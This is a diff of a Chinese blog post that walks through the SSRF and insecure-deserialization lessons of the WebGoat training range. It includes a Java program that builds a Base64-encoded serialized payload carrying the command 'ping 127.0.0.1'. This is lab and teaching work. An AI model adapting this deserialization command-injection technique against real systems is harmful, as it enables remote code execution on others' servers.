@@ -272,7 +272,7 @@
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Mon Jul 28 2025 11:52:00 GMT+0800">2025-07-28 11:52:00</span>
+                    <span class="datetime" data-updated="Mon Jul 28 2025 17:13:05 GMT+0800">2025-07-28 17:13:05</span>
                 </span>
             
         
@@ -305,7 +305,7 @@
         
         
             <span class="meta-info-item post-wordcount">
-                <i class="icon fas fa-file-word"></i>&nbsp;<span>314 字</span>
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>315 字</span>
             </span>
         
         
@@ -334,15 +334,15 @@
                     
                          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这里考的异常简单，连常见的绕过手法和协议都没讲，感觉设计的不太完善。之后会再单独出一篇来学Java的SSRF。这里为了完整性，还是写一下。</p>
 <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="第一题-第二题"><a href="#第一题-第二题" class="headerlink" title="第一题&amp;第二题"></a>第一题&amp;第二题</h2><p>第一题读内部数据，第二题向外发请求，基本一样。</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/image-1753668905834.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753668718842-53b4112d-9c4c-4ac4-9a4a-8e1121deedd0.png"  alt="img"></p>
 <p>直接改url这里的就行。第二题整个替换掉就行。</p>
 <p>源码部分，这两题用的都是单纯的字符串匹配，实际上就不是真正的ssrf：</p>
-<p><img   src="/WebGoat%E9%9D%B6%E5%9C%BA-SSRF/image-1753668905869.png"  alt="img"></p>
+<p><img   src="https://cdn.nlark.com/yuque/0/2025/png/53465197/1753668837777-860d792f-4244-468b-a482-4c0887074674.png"  alt="img"></p>
 <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>这里要注意用webgoat给你提供的反序列化类org.dummy.insecure.framework.VulnerableTaskHolder</p>
-<p>然后windows下是没有sleep命令的，所以我这里用ping，ping 127.0.0.1就行，也能满足延迟。</p>
+<p>然后windows下是没有sleep命令的，所以我这里用ping，ping 127.0.0.1就行，也能满足延迟3s–7s</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.owasp.webgoat.lessons.deserialization.tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> org.dummy.insecure.framework.VulnerableTaskHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">sleep</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] ser(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">VulnerableTaskHolder</span> <span class="variable">vul</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableTaskHolder</span>(<span class="string">&quot;webgoat&quot;</span>, <span class="string">&quot;ping 127.0.0.1&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] ser = ser(vul);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(ser);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>另外2025版本的靶场用的是jdk23，Templates的Sink链都用不了了。</p>
+<p>另外2025版本的靶场用的是jdk23，Templates的Sink链都用不了。</p>
 
                     
                 </div>
@@ -433,13 +433,13 @@
                                 <a class="prev"
                                    rel="prev"
                                    href="/2025/07/28/WebGoat%E9%9D%B6%E5%9C%BA-XSS/"
-                                   title="WebGoat靶场-XSS"
+                                   title=""
                                 >
                                     <span class="left arrow-icon flex-center">
                                         <i class="fas fa-chevron-left"></i>
                                     </span>
                                     <span class="title flex-center">
-                                        <span class="post-nav-title-item text-ellipsis">WebGoat靶场-XSS</span>
+                                        <span class="post-nav-title-item text-ellipsis"></span>
                                         <span class="post-nav-item">上一篇</span>
                                     </span>
                                 </a>
